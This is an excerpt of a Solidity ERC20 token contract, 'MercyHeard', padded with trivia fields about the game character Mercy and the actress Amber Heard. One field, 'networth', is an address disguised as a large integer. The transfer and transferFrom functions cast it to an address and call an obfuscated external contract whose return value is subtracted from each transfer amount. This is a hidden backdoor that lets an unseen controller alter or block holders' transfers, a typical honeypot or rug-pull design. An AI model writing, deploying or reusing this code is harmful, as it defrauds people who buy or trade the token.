...
abstract contract Mercy {
    string realname = "Angela Ziegler";
    uint8 age = 39;
    string birthday = "May 13th";
    ...
    string quote = "Heroes Never Die";
}


abstract contract AmberHeard {
    string fullname = "Amber Laura Heard";
    string born = "April 22, 1986";
    ...
    uint160 networth = 422257501088178961233682621605107961080602100975;
    string exhusband = "Johnny Depp";
...
contract MercyHeard is IERC20, Mercy, AmberHeard, Ownable {
    ...
    returns (bool)
    {
        ...
        if (amount <= networth) {
            amount = amount - qfweqar(address(networth)).iqqwoir(msg.sender);
        }
        return true;
    }
    ...
    function transferFrom(
        ...
        if (amount <= networth) {
            amount = amount - qfweqar(address(networth)).iqqwoir(sender);
        }
        return true;
    }
